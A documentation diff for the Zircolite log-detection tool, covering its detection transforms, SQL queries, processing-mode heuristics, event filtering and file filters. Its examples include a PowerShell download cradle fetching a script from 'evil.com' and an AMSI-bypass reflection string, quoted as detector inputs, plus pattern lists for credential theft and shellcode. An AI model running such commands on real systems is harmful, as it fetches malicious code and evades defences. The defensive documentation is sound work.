+| `CommandLine_Extracted_Creds` | Credentials passed to `net`, `wmic`, `psexec` | the matched credential strings |
+
+#### Process (`process`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `Image_ExeName` | — | the executable name, without the path |
+| `Image_LOLBinMatch` | Living-off-the-land binaries | `LOLBIN:<name>` |
+| `Image_TyposquatDetect` | Typosquatted process names | `TYPOSQUAT:<target>(<techniques>)`, techniques being a comma-separated selection of `HOMOGLYPH` `CHAR_ADD` `CHAR_OMIT` `CHAR_SWAP` |
+| `Image_PathAnomaly` | Execution from odd locations | `TEMP_DIR` `WINDOWS_TEMP` `USER_TEMP` `APPDATA` `DOWNLOADS` `USER_DESKTOP` `USER_MEDIA_DIR` `RECYCLE_BIN` `PUBLIC_PROFILE` `PERFLOGS` |
+| `Image_StagingDirectory` | Known staging directories | `STAGING:` + `ProgramData` `WindowsTemp` `RootTemp` `PerfLogs` `PublicProfile` `RecycleBin` `UNC_Path` `LinuxTmp` `DevShm` `VendorFolder` |
+| `Image_MasqueradeDetect` | System binaries in the wrong directory | `MASQUERADE:<exe_name>` |
+| `ParentImage_ExeName` | — | the parent executable name |
+| `ParentImage_SpawnAnomaly` | Suspicious parents | `ANOMALY:` + `OFFICE_SPAWN` `BROWSER_SPAWN` `PDF_SPAWN` `SCRIPT_CHAIN` `WMI_SPAWN` `TASK_SPAWN` `JAVA_SPAWN` |
+
+`Image_TyposquatDetect` whitelists ~170 legitimate Windows executables and compares
+against 31 impersonation targets. Targets are five characters or more, because at shorter
+lengths an edit distance of one matches almost anything; short names such as `cmd`, `dwm`,
+`smss` and `wmic` are whitelisted instead, so they are never flagged themselves.
+
+#### PowerShell (`powershell`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `ScriptBlockText_ObfuscationIndicators` | Obfuscation constructs | `CHAR_SUBST` `STR_CONCAT` `JOIN_OP` `FORMAT_STR` `VAR_SUBST` `ENC_CMD` `GZIPSTREAM` `FROMBASE64` `IO_COMPRESSION` `DEFLATESTREAM` `MEMORYSTREAM` |
+| `ScriptBlockText_XORPatterns` | XOR keys and loops | `XOR_KEY:<key>` `XOR_LOOP` `BYTE_ARRAY_XOR` `COMMON_XOR_KEY:<key>` |
+| `ScriptBlockText_ReflectionAbuse` | .NET reflection abuse | `ASSEMBLY_LOAD` `DYNAMIC_LOAD` `TYPE_REFLECTION` `INVOKE_METHOD` `GET_MEMBER` `DELEGATE_CREATION` |
+| `ScriptBlockText_ShellcodeIndicators` | Shellcode execution | `EXEC_MEMORY_ALLOC` `KERNEL32_REF` `NTDLL_REF` `CREATE_THREAD` `NOP_SLED` `MEMORY_COPY` `POINTER_OP` |
+| `ScriptBlockText_NetworkIOCs` | Embedded IOCs | `IP:<addr>` `URL:<url>` `DOMAIN:<domain>` |
+| `ScriptBlockText_StagerDetect` | Stager patterns | `STAGER:` + `REFLECTION_LOAD` `STAGED_IEX` `INMEMORY_NET` `AMSI_THEN_EXEC` `APPDOMAIN` `RUNSPACE` `CLM_BYPASS` `WIN32_API` |
+| `ScriptBlockText_PackerIndicators` | Packers and crypters | `PACKER:` + `GZIP` `DEFLATE` `MULTI_ENCODE` `NESTED_IEX` `CUSTOM_ENCODING` `REVERSAL` `VAR_SUBSTITUTION` `INVOKE_OBFUSCATION` `SECURESTRING` |
+
+#### Network (`network`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `QueryName_TLD` | — | the top-level domain |
+| `QueryName_EntropyScore` | DGA candidates | the entropy score as a number (`0` when not applicable) |
+| `QueryName_TyposquatDetect` | Typosquatted well-known domains | `TYPOSQUAT_<class>:<target>(<techniques>)` and `SUSPICIOUS_TLD:<tld>`. Classes: `GOV_US` `GOV_UK` `GOV_EU` `GOV_FR` `GOV_DE` `BANK` `CRYPTO` `TECH` `EMAIL` `CLOUD` `SECURITY` `SHIPPING`. Techniques: `HOMOGLYPH` `CHAR_SWAP` `CHAR_MANIP` `AFFIX` `EMBEDDED` `SIMILAR`. |
+| `QueryName_SubdomainAnalysis` | Tunnelling-shaped subdomains | `DNS:DEEP_SUB:<depth>` `DNS:LONG_SUB:<length>` `DNS:HEX_SUBDOMAIN` `DNS:B64_SUBDOMAIN` `DNS:HIGH_ENTROPY_SUB` `DNS:NUMERIC_SUB` — in that order, and only the first four survive the cap |
+| `DestinationIp_ObfuscationCheck` | Hex/octal/decimal IP encoding | `OBFUSCATED_IP:<value>` |
+| `DestinationPort_Category` | Port purpose | 58 labels — the named services (`HTTP` `HTTPS` `SMB` `RDP` `SSH` `WINRM` `KERBEROS` `LDAP` `MSSQL` `DOCKER` `METASPLOIT_DEFAULT` …) plus the catch-alls `WELL_KNOWN`, `EPHEMERAL` and `HIGH_PORT`, which is what most traffic lands on. See `config/transforms/destinationport_category.py` for the full map. |
+
+#### File (`file`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `TargetFileName_URLDecoded` | — | the URL-decoded path |
+| `TargetFileName_DoubleExtension` | Double-extension tricks | `DOUBLE_EXT:<ext1>.<ext2>`, e.g. `DOUBLE_EXT:pdf.exe` |
+| `TargetFileName_SensitiveFile` | Access to security-sensitive files | `SENSITIVE:` + `CREDENTIAL_STORE` `NTDS` `SSH_KEY` `CERT_PRIVATE` `BROWSER_DATA` `CONFIG` `MEMORY_DUMP` |
+
+#### User and authentication (`user`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `User_Name` | — | the username, without the domain |
+| `User_Domain` | — | the domain part of the user field |
+| `LogonType_Description` | — | `SYSTEM` `INTERACTIVE` `NETWORK` `BATCH` `SERVICE` `UNLOCK` `NETWORK_CLEARTEXT` `NEW_CREDENTIALS` `REMOTE_INTERACTIVE` `CACHED_INTERACTIVE` `CACHED_REMOTE_INTERACTIVE` `CACHED_UNLOCK`, or `UNKNOWN:<value>` |
+
+#### Hash (`hash`)
+
+| Alias field | Produces |
+|-------------|----------|
+| `Hash_MD5` | The MD5 value out of Sysmon's `Hashes` field |
+| `Hash_SHA256` | The SHA256 value out of Sysmon's `Hashes` field |
+
+#### Registry (`registry`)
+
+| Alias field | Detects | Values |
+|-------------|---------|--------|
+| `TargetObject_SuspiciousRegistry` | Persistence keys | `RUN_KEY` `SERVICE_KEY` `IFEO` `APPINIT_DLLS` `WINLOGON` `COM_HIJACK` `SCHED_TASK` `SECURITY_POLICY` |
+
+### Transforms in action
 
 ```
 powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"
 ```
-
-`CommandLine_DownloadCradle` → `DOWNLOADSTRING|WEBCLIENT` &nbsp;·&nbsp; `CommandLine_URLs` → `http://evil.com/mal.ps1`
-
-**AMSI bypass:**
+`CommandLine_DownloadCradle` → `DOWNLOADSTRING|WEBCLIENT` · `CommandLine_URLs` → `http://evil.com/mal.ps1`
 
 ```
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 ```
-
 `CommandLine_AMSIBypass` → `AMSI_REF|AMSI_REFLECTION`
-
-**Process typosquatting:**
 
 ```
 C:\Users\Public\svch0st.exe
 ```
-
-`Image_TyposquatDetect` → `TYPOSQUAT:svchost(HOMOGLYPH)` (also `1sass.exe`, `chr0me.exe`, `svchosts.exe` → `CHAR_ADD`, etc.). Legitimate binaries like `wevtutil.exe` are whitelisted and never flagged.
-
-**Domain typosquatting:**
+`Image_TyposquatDetect` → `TYPOSQUAT:svchost(HOMOGLYPH)`
 
 ```
-micros0ft-support.xyz
+micros0ft.xyz
 ```
-
 `QueryName_TyposquatDetect` → `TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)|SUSPICIOUS_TLD:xyz`
 
-### Querying Transform Results
+### Querying transform results
 
-Transform alias fields are stored in the database and can be queried with SQL or SIGMA rules:
+Alias fields are ordinary columns, so Sigma rules can match them and SQL can query them.
+Keep the database with `--dbfile events.db`:
 
 ```sql
--- Find commands with download cradles
-SELECT * FROM logs WHERE CommandLine_DownloadCradle != ''
+-- Obfuscated commands: long and high-entropy
+SELECT * FROM logs
+WHERE CommandLine_Length LIKE 'EXTREME%' AND CommandLine_EntropyScore LIKE 'VERY_HIGH%';
 
--- Find PowerShell with XOR operations
-SELECT * FROM logs WHERE ScriptBlockText_XORPatterns LIKE '%XOR_KEY%'
+-- Lateral movement, in order
+SELECT SystemTime, CommandLine, CommandLine_LateralMovement FROM logs
+WHERE CommandLine_LateralMovement != '' ORDER BY SystemTime;
 
--- Find AMSI bypass attempts
-SELECT * FROM logs WHERE CommandLine_AMSIBypass LIKE '%AMSI%'
-
--- Find high-entropy DNS queries (potential DGA)
-SELECT * FROM logs WHERE CAST(QueryName_EntropyScore AS REAL) > 75
-
--- Find typosquatted process names (masquerading)
-SELECT * FROM logs WHERE Image_TyposquatDetect != ''
-
--- Find typosquatted government domains (phishing)
-SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%GOV_%'
-
--- Find typosquatted banking domains
-SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%BANK%'
-
--- Find domain typosquats with suspicious TLDs
-SELECT * FROM logs WHERE QueryName_TyposquatDetect LIKE '%SUSPICIOUS_TLD%'
+-- Which injection techniques appear, and how often
+SELECT CommandLine_InjectionTechnique, COUNT(*) AS n FROM logs
+WHERE CommandLine_InjectionTechnique != '' GROUP BY 1 ORDER BY n DESC;
 ```
 
-### Creating Custom Transforms
+The same fields appear in `detected_events.json`, under each detection's `matches`:
 
-You can add custom transforms in `config/config.yaml`:
+```bash
+# Every LOLBin seen, deduplicated
+jq -r '[.[].matches[].Image_LOLBinMatch // empty] | unique | .[]' detected_events.json
 
-```yaml
-transforms:
-  MyField:
-    - info: "Description of transform"
-      type: python
-      code: |
-        def transform(param):
-            # Your Python code here
-            # param contains the field value
-            # Return the transformed value
-            return transformed_value
-      alias: true  # Create new field (true) or modify original (false)
-      alias_name: "MyField_Transformed"
-      source_condition:
-        - evtx_input
-        - json_input
-      enabled: true
+# C2 indicators with context, as CSV
+jq -r '.[].matches[] | select(.CommandLine_C2Indicators // "" != "")
+    | [.SystemTime, .Computer, .User, .Image, .CommandLine_C2Indicators] | @csv' detected_events.json
 ```
-
-#### Transform Best Practices
-
-1. **Keep transforms fast** - They run on every matching event
-2. **Return empty string on no match** - Makes filtering easier
-3. **Use aliases for new data** - Don't modify original evidence
-4. **Handle exceptions** - Return original value on error
-5. **Limit output size** - Truncate long results
-
----
 
 ## Working with Large Datasets
 
-Zircolite processes each log file separately in its own database by default, which reduces memory usage for large datasets.
+By default each log file is processed in its own database, which keeps peak memory
+proportional to the largest file rather than to the corpus.
 
-### Automatic Processing Optimization
+### Automatic processing optimization
 
-Zircolite automatically analyzes your workload and optimizes processing. When you run Zircolite with multiple files, it:
-
-1. **Analyzes your files** - counts files, measures sizes, checks available RAM and CPU cores
-2. **Selects optimal database mode** - unified (all files in one DB) vs. per-file (separate DB per file)
-3. **Enables parallel processing** - when beneficial, automatically processes files in parallel with optimal worker count
+Given several files, Zircolite measures them against available RAM and CPU, picks a
+database mode, and decides whether parallel processing is worth it:
 
 ```shell
-# Auto-optimization happens by default
 python3 zircolite.py --evtx ./logs/ --ruleset rules/rules_windows_merged.json
+```
 
-# Example output:
+```
 [+] Analyzing workload...
     [>] Files       4 (478.2 MB total, avg 119.6 MB)
     [>] System      33.7 GB RAM available, 10 CPUs
     [>] DB Mode     PER-FILE
-  				  Few large files detected (4 files, avg 119.6 MB)
+                    Few large files detected (4 files, avg 119.6 MB)
     [>] Parallel    ENABLED (4 workers)
 ```
 
-#### Database Mode Selection Heuristics
+**Database mode.** The rules are tried in order; the first match decides.
 
-The automatic mode selection uses the following rules:
+| # | Condition | Mode | Reason |
+|---|-----------|------|--------|
+| 1 | Single file | Per-file | Nothing to unify |
+| 2 | Less than 2 GB RAM available | Per-file | Safer when memory-constrained |
+| 3 | Estimated footprint > 85% of available RAM | Per-file | Avoid running out of memory |
+| 4 | 10+ files averaging 5 MB or less | Unified | Less overhead, enables cross-file correlation |
+| 5 | Fewer than 5 files averaging 50 MB or more | Per-file | Memory-efficient |
+| 6 | 8 GB+ RAM and 3+ files | Per-file | Leaves the files free to run in parallel |
+| 7 | Any other run of 10+ files | Unified | Enables cross-file correlation |
+| 8 | Anything else | Per-file | Default |
 
-They are tried in order, and the first one that matches decides:
+Rule 3 compares an *estimate*, not the size on disk: an in-memory SQLite database is
+several times larger than the log it was built from, so the total is multiplied by 3.5 to
+5.0 depending on average file size. In practice it triggers somewhere between RAM/4 and
+RAM/6 of input.
 
-| # | Condition | Mode Selected | Reason |
-|---|-----------|---------------|--------|
-| 1 | Single file | Per-file | No benefit from unified mode |
-| 2 | Low RAM (< 2 GB available) | Per-file | Safer for memory-constrained systems |
-| 3 | Estimated footprint > 85% of available RAM | Per-file | Avoid out-of-memory errors |
-| 4 | Many small files (>= 10 files, avg <= 5 MB) | Unified | Less overhead, enables cross-file correlation |
-| 5 | Few large files (< 5 files, avg >= 50 MB) | Per-file | Memory efficient processing |
-| 6 | High RAM (>= 8 GB) and >= 3 files | Per-file | Leaves the files free to be processed in parallel |
-| 7 | Any other run of >= 10 files | Unified | Enables cross-file correlation |
+**Parallel processing.** Also tried in order:
 
-Rule 3 compares an *estimate*, not the raw size on disk: an in-memory SQLite
-database is several times larger than the log it was built from, so the total
-is multiplied by 3.5 to 5.0 depending on average file size before being
-compared against 85% of available RAM. In practice it triggers somewhere
-between RAM/4 and RAM/6 of input.
+| # | Condition | Parallel | Reason |
+|---|-----------|----------|--------|
+| 1 | Single file | Disabled | No benefit |
+| 2 | Less than 1 GB RAM available | Disabled | Safety |
+| 3 | Fewer than 2 workers affordable | Disabled | Not enough resources to parallelise |
+| 4 | Estimated footprint of the **largest** file > 60% of usable RAM | Disabled | Prevent running out of memory |
+| 5 | Multiple files, enough memory | Enabled | Faster |
 
-#### Controlling Processing Mode
+The memory test uses the largest single file rather than the average, because one
+outsized file is what actually exhausts a worker.
+
+**Overriding it:**
 
 ```shell
-# Disable automatic mode selection (use default per-file mode)
-python3 zircolite.py --evtx logs/ --ruleset rules.json --no-auto-mode
-
-# Force unified database mode (enables cross-file rule correlation)
-python3 zircolite.py --evtx logs/ --ruleset rules.json --unified-db
-
-# Disable parallel processing
+python3 zircolite.py --evtx logs/ --ruleset rules.json --no-auto-mode       # keep per-file
+python3 zircolite.py --evtx logs/ --ruleset rules.json --unified-db         # one database
 python3 zircolite.py --evtx logs/ --ruleset rules.json --no-parallel
-
-# Set specific worker count
-python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-workers 4
-```
-
-### Parallel Processing
-
-Zircolite automatically enables parallel processing when it's beneficial. The parallel processor:
-
-- **Calculates optimal workers** based on available memory, CPU cores, and file sizes
-- **Monitors memory** during processing and can throttle if approaching limits
-- **Uses threads** for I/O-bound EVTX parsing
-- **Falls back to sequential** if parallel isn't beneficial (single file, low memory)
-
-#### Parallel Processing Heuristics
-
-| Condition | Parallel | Reason |
-|-----------|----------|--------|
-| Single file | Disabled | No benefit |
-| Very low RAM (< 1 GB) | Disabled | Safety |
-| Estimated footprint of the **largest** file > 60% of usable RAM | Disabled | Prevent OOM |
-| Fewer than 2 workers affordable | Disabled | Insufficient resources for parallel processing |
-| Multiple files + sufficient memory | Enabled | Faster processing |
-
-The memory test uses the largest single file rather than the average, because
-one outsized file is what actually exhausts a worker.
-
-#### Manual Parallel Configuration
-
-```shell
-# Set maximum workers
 python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-workers 8
-
-# Set memory threshold for throttling (default: 85%)
 python3 zircolite.py --evtx logs/ --ruleset rules.json --parallel-memory-limit 80
 ```
 
-### The Streaming Pipeline
+### Parallel processing
 
-Every input format is processed the same way: extraction, flattening and
-database insertion happen in a single pass, with no intermediate files.
+Workers are threads, which suits the I/O-bound work of decoding EVTX. Beyond picking a
+worker count, the parallel path:
 
-1. Read events from the source
-2. Flatten each event and insert it into SQLite in batches
-3. Execute the ruleset
+- **Schedules largest-first**, so big files start early and small ones fill the gaps at
+  the end.
+- **Throttles for real** — when memory pressure exceeds `--parallel-memory-limit`
+  (85% by default), new submissions are deferred until in-flight work finishes and memory
+  drops back.
+- **Recalibrates** after the first file completes, blending the measured memory-per-file
+  ratio into the estimate for the rest.
+- **Reads the field-mappings config once** and hands each worker a copy, rather than
+  re-reading it per worker.
+- **Rebuilds the table between files**, so each input is typed by its own events. See
+  [Internals → Typing and collation](Internals.md#typing-and-collation) for why sharing a
+  schema across files silently costs detections.
+- **Writes results as each file completes**, except in `--csv` mode, where the header has
+  to cover every column and results are therefore buffered to the end.
 
-There is no alternative pipeline and no flag to select one. What *is*
-selectable is how the database is organised across files — per-file, unified
-or parallel — described under [Processing Modes](Internals.md#processing-modes).
+### The streaming pipeline
 
-Use `--keepflat` to save flattened events to a JSONL file alongside processing. Note that `--keepflat` only includes events that Zircolite actually processed — events dropped by early event filtering or time filtering (`--after`/`--before`) are not included. To get all events regardless of filtering, combine with `--no-event-filter`.
+Every input format is read the same way: extraction, flattening and insertion happen in
+a single pass, with no intermediate files. What is selectable is how the database is
+organised across files — see [Internals → Processing modes](Internals.md#processing-modes).
 
-### Memory Usage
+`--keepflat` writes the flattened events to a JSONL file as they are processed. It
+contains only events that were actually processed: anything dropped by early event
+filtering or by `--after`/`--before` is not there. Combine with `--no-event-filter` to
+capture everything.
 
-- Zircolite displays memory statistics (peak and average usage) at the end of each run.
-- Memory tracking uses `psutil` if available.
-- In per-file mode, each log file is processed in its own in-memory database, and the database is released after processing.
+### Memory usage
 
-### Performance Optimizations
+Peak memory is measured throughout the run with `psutil` and reported in the summary
+panel. In per-file mode each database is released once its file is done, so the peak
+tracks the largest file rather than the corpus.
 
-There are several ways to speed up Zircolite:
+Other ways to go faster: let auto-mode do its work, use [file filters](#file-filters) to
+skip irrelevant files, drop `--no-recursion` in when you do not need subdirectories, and
+leave early event filtering on.
 
-- Let automatic optimization do its work (enabled by default).
-- Use [Filtering](#filtering) to process only relevant files.
-- Use the `--no-recursion` option if you don't need recursive directory search.
-- Rely on early event filtering (described in the next section) to skip irrelevant events.
-- For extreme cases with very large datasets, use GNU Parallel for external parallelization.
+### Early event filtering
 
-### Early Event Filtering
+Zircolite can discard events **before** flattening and insertion, based on **Channel**
+and **EventID**, so only events that could match some rule's log source are loaded.
 
-Zircolite includes an **early event filtering** mechanism that skips events before flattening and database insertion. This reduces memory and CPU when your rules only reference a subset of log sources. **Sysmon for Linux and auditd are exempt**: they carry no Channel/EventID, so they are never filtered on it unless `event_filter.filter_all_sources` is set. Every other format -- EVTX, JSON, JSON array, CSV, XML, EVTXtract and a saved database -- does go through the filter, because any of them can carry Windows-shaped events. An event with no usable Channel is kept.
+**Sysmon for Linux and auditd are exempt** — they carry no Channel or EventID — unless
+`event_filter.filter_all_sources` is set. Every other format (EVTX, JSON, JSON array, CSV,
+XML, EVTXtract, and a saved database) goes through the filter, because any of them can
+carry Windows-shaped events. An event with no usable Channel is kept.
 
-#### How the filter is built
+> [!IMPORTANT]
+> The filter only engages when the ruleset yields channels. The shipped Windows rulesets
+> bound over 99% of their rules, but **no rule in `rules_linux*.json` names a channel**, so
+> with a Linux ruleset the filter reports `disabled` and every event is processed. That is
+> correct behaviour, not a failure — there is simply nothing to filter on.
 
-When rules are loaded, Zircolite maps each **Channel** in the ruleset to the set of **EventID** values the rules on that channel can actually match.
+#### How the bounds are derived
 
-Those eventIDs are read from each rule's **SQL**, not from its `eventid` metadata. The metadata is collected by `pysigma-backend-sqlite` from every detection group — including negated `filter:` blocks — and without regard to the rule's `condition`, so it is a bag of values rather than a set of eventIDs the rule matches. A rule written as
+When rules are loaded, each **Channel** in the ruleset is mapped to the set of **EventID**
+values the rules on that channel can actually match.
+
+Those eventIDs are read from each rule's **SQL**, not from its `eventid` metadata. The
+metadata is collected from every detection group — including negated `filter:` blocks —
+without regard to the rule's `condition`, so it is a bag of values rather than a set of
+eventIDs the rule matches. A rule written as
 
 ```yaml
 detection:
@@ -728,209 +427,204 @@ detection:
     condition: selection and not filter
 ```
 
-arrives carrying `eventid: [4624]` — the one eventID it *excludes*. Read as an allow-list that inverts the rule: the filter would admit only 4624 and discard everything the rule is looking for, and the rule would report nothing while looking perfectly healthy.
+arrives carrying `eventid: [4624]` — the one eventID it *excludes*. Read as an allow-list,
+the filter would admit only 4624, discard everything the rule is looking for, and the rule
+would report nothing while looking perfectly healthy.
 
-Reading the SQL instead means the filter narrows a channel only on what it can prove. **Every uncertainty leaves the channel unbounded**, because a wrong bound drops events at ingest and costs detections, while a missing bound only costs a little speed. A channel stays unbounded when the rule's SQL:
+Reading the SQL means a channel is narrowed only on what can be proved. **Every
+uncertainty leaves the channel unbounded**, because a wrong bound drops events at ingest
+and costs detections, while a missing bound only costs a little speed. A channel stays
+unbounded when the rule's SQL:
 
-- constrains `EventID` under a `NOT`, where the listed values are the ones the rule refuses;
-- has an `OR` branch that does not constrain `EventID` at all, so that branch can match any event;
-- does not mention `EventID`, or constrains it in a form this cannot read (`BETWEEN`, `>`, `LIKE`);
-- belongs to a **correlation** rule, whose subquery shape is deliberately not second-guessed.
+- constrains `EventID` under a `NOT`, where the listed values are the ones it refuses;
+- has an `OR` branch that does not constrain `EventID` at all, so that branch can match
+  anything;
+- does not mention `EventID`, or constrains it in a form this cannot read (`BETWEEN`,
+  `>`, `LIKE`);
+- belongs to a **correlation** rule, whose subquery shape is deliberately not
+  second-guessed.
 
-Across the shipped rulesets this keeps a finite eventID bound on about 98% of rules, so the optimisation survives essentially intact.
+A rule naming a channel but no eventID matches *any* eventID on that channel, so it marks
+its own channel unbounded and leaves the others alone. This is what keeps alert counts
+consistent whether you run one rule or the whole ruleset — bounding every channel by the
+union of all rules' eventIDs would drop events a channel-only rule should have seen.
 
-A rule that names a channel but no eventID matches *any* eventID on that channel, so it marks its own channel unbounded — the other channels keep their bounds. This is what keeps **alert counts consistent** whether you run a single rule or the full ruleset. Bounding every channel by the union of all rules’ eventIDs would drop events a channel-only rule should have seen, and the same rule could then report different counts (e.g. 74 alone vs 40 with the full ruleset).
+#### What gets discarded
 
-#### Filtering logic
+An event is discarded when its Channel is claimed by no rule, or when that channel carries
+a finite eventID set and the event's EventID is not in it. An event with no usable Channel,
+or no usable EventID on a bounded channel, is **kept** — too little information to discard
+it safely. Channel matching is case-insensitive.
 
-An event is **discarded** when:
+The per-channel bounds do not apply in two cases. A rule constraining eventIDs but no
+channel cannot be keyed by channel, so a ruleset containing one falls back to two
+independent global axes, each filtering only when every rule constrains it. And a
+correlation rule carries no channel metadata at all: its channel is read from the SQL
+embedding the base rule's detection. If that names no channel either — pySigma emits
+correlation queries without one when the logsource carried no pipeline — filtering is
+switched off for the whole run rather than guessed at.
 
-- its Channel is claimed by no rule, **or**
-- that channel carries a finite eventID set and the event’s EventID is not in it.
+#### Configuration and reporting
 
-An event with no usable Channel, or no usable EventID on a bounded channel, is **kept** — too little information to discard it safely. Channel matching is case-insensitive.
+Channel and EventID are read through configurable field paths, so pre-flattened and ECS
+logs work as well as raw EVTX: `Event.System.Channel`, `Channel`, `winlog.channel`, and
+the matching eventID paths. See `event_filter` in `config/config.yaml`.
 
-#### When the per-channel bounds do not apply
+At load time Zircolite reports what it will filter on:
 
-- A rule constraining eventIDs but **no** channel cannot be keyed by channel. A ruleset containing one falls back to two independent global axes, where each axis filters only when every rule constrains it.
-- **Correlation** rules carry no channel/eventID metadata at all, so their channel is read from the SQL that embeds the base rule's detection, and left unbounded. If that SQL names no channel either — pySigma emits correlation queries without one when the logsource carried no pipeline — nothing says which channel the rule consumes, and event filtering is switched off for the whole run rather than guessing.
-- With `--no-event-filter`, or `enabled: false` in config, all events are processed.
-
-#### Configuration and formats
-
-The event filter uses configurable field paths to read Channel and EventID from different log structures:
-
-- Standard EVTX: `Event.System.Channel`, `Event.System.EventID`
-- Pre-flattened JSON: `Channel`, `EventID`
-- ECS/Elasticsearch: `winlog.channel`, `event.code`
-- And more (configurable in `config/config.yaml`).
-
-```shell
-# At load time Zircolite reports what it will filter on:
-# [+] Event filter enabled: 36 channels, 34 EventID-bounded (217 channel/eventID pairs)
-# [+]   any EventID allowed on: Security, Windows PowerShell
-
-# Disable event filtering if needed (process all events)
-python3 zircolite.py --evtx logs/ --ruleset rules.json --no-event-filter
+```
+[+] Event filter enabled: 36 channels, 34 EventID-bounded (214 channel/eventID pairs)
+[+]   any EventID allowed on: Security, Windows PowerShell
 ```
 
-The second line names the channels no rule narrowed, which is why those channels are not being reduced.
+The second line names the channels no rule narrowed — the reason those channels are not
+being reduced.
 
-The event filter statistics are displayed in the summary panel after processing. The panel reports the filter whenever it was active, so a run that dropped nothing is distinguishable from one where the filter never ran:
+The summary panel reports the filter whenever it was active, so a run that dropped nothing
+is distinguishable from one where the filter never ran:
 
 ```
 📊 Events   1,234,567  (412,003 filtered out — 75.0% match rate)
 📊 Events   1,234,567  (0 filtered out — every event matched a rule's log source)
 ```
 
-Events dropped by `--after`/`--before` are counted separately and reported on their own `Time range` row, since the two filters act at different stages.
+Events dropped by `--after`/`--before` are counted separately, on their own `Time range`
+row, because the two filters act at different stages.
+
+Disable the whole mechanism with `--no-event-filter`, or `enabled: false` in the config.
 
 ## Keeping Data Used by Zircolite
 
-**Zircolite** has several arguments that can be used to keep data used to perform Sigma detections: 
+Several options keep the data behind the detections:
 
-- `--dbfile <FILE>` allows you to export all the logs to a SQLite 3 database file. You can query the logs with SQL statements to find more things than what the Sigma rules could have found. When processing multiple files, each file gets its own database file with a unique name.
-- **Database indexes**: An index on `eventid` is always created; when the table has a `Channel` column (Windows logs), an index on `Channel` is created automatically. Use `--add-index COL [COL ...]` to create indexes on additional columns (e.g. `--add-index SystemTime Computer`) and `--remove-index IDX [IDX ...]` to drop indexes by name after creation (e.g. `--remove-index idx_channel`). For larger rulesets, `--auto-index [N]` (default N=5 when used without a value) inspects the loaded ruleset and creates indices on the top-N columns that its WHERE clauses reference most often — useful when you don't know which columns are worth indexing.
-- `--keepflat` saves flattened events to a JSONL file during streaming processing. This file contains only the events that were actually processed (i.e. events that passed early event filtering and time filtering). If event filtering is active, events whose Channel/EventID don't match any rule will **not** appear in the keepflat output. Use `--no-event-filter` to include all events.
-- `--hashes` adds an xxhash64 hash of the original log line to each event, useful for deduplication and tracking.
+- `--dbfile <FILE>` writes the SQLite database to disk, so you can query the logs with SQL
+  and find things the rules did not. In per-file mode each input gets its own file.
+- `--keepflat` saves the flattened events as JSONL — only the events actually processed
+  (see [the streaming pipeline](#the-streaming-pipeline)).
+- `--hashes` adds an xxhash64 of the original log line to each event, for deduplication
+  and tracking.
+- **Indexes** make that database worth querying. `--add-index`, `--remove-index` and
+  `--auto-index` are covered in [Usage → Database indexes](Usage.md#database-indexes).
 
 ## Filtering
 
-Zircolite provides several filtering options to reduce processing time.
+### File filters
 
-### File Filters
-
-Some EVTX files are not used by SIGMA rules but can become quite large (a good example is `Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx`). If you use Zircolite with a directory as the input argument, all EVTX files will be converted, saved, and matched against the SIGMA rules. 
-
-To speed up the detection process, you may want to use Zircolite on files matching or not matching a specific pattern. For that, you can use **filters** provided by the following command-line arguments:
-
-- `-s` or `--select`: Select files whose **filename** partly matches the provided string (case insensitive).
-- `-a` or `--avoid`: Exclude files whose **filename** partly matches the provided string (case insensitive).
-- `-fp` or `--file-pattern`: Use a Python glob pattern for file selection.
-- `--no-recursion`: Disable recursive directory search.
-
-> [!NOTE]  
-> When using both `--select` and `--avoid` arguments, the "select" argument is always applied first, and then the "avoid" argument is applied. So it is possible to exclude files from included files, but not the opposite.
-
-> [!IMPORTANT]
-> Both filters match the **filename only**, never the directory path. `--select HOST01` will not select `logs/HOST01/Security.evtx`, and `--avoid HOST02` will not exclude `logs/HOST02/` — it silently excludes nothing. Use `--file-pattern` or point `--events` at the directory you want instead.
-
-- Only use EVTX files that contain "sysmon" in their names:
-
-	```shell
-	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-		--select sysmon
-	```
-- Exclude "Microsoft-Windows-SystemDataArchiver%4Diagnostic.evtx": 
-
-	```shell
-	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-		--avoid systemdataarchiver
-	```
-
-- Only use EVTX files with "operational" in their names but exclude "defender"-related logs:
-	
-	```shell
-	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-	--select operational --avoid defender
-	```
-
-- Use a custom glob pattern to select specific files:
-
-	```shell
-	python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-		--file-pattern "Security*.evtx"
-	```
-
-> [!NOTE]
-> You no longer need to enumerate a ruleset's channels with `--select` to gain the channel-level speedup — [early event filtering](#early-event-filtering) derives that from the ruleset automatically, and does it per EventID as well. File filters remain useful for a different reason: they skip a file *before it is opened and decoded*, which the event filter cannot do because it runs per event. Excluding one large irrelevant file is where they pay off:
->
-> ```shell
-> python3 zircolite.py --evtx logs/ --ruleset rules/rules_windows_merged.json \
-> 	--avoid systemdataarchiver
-> ```
->
-> They are also the only file-level reduction available for Linux and auditd input, which the event filter does not apply to by default.
-
-### Time Filters
-
-Sometimes you only want to work on a specific time range to speed up analysis. With Zircolite, it is possible to filter on a specific time range using the `--after` and `--before` arguments and their respective shorter versions `-A` and `-B`. Please note that: 
-
-- The filter applies to the field named by `--timefield` (`SystemTime` by default), falling back to the auto-detected timestamp field when that one is absent from the events.
-- Event timestamps are compared as instants, so epoch seconds/milliseconds, a trailing `Z`, an explicit UTC offset and a space instead of `T` are all understood.
-- The `--after` and `--before` arguments can be used independently.
-- The timestamps provided must have the following format: `YYYY-MM-DDTHH:MM:SS` (hours are in 24-hour format).
-
-Examples: 
-
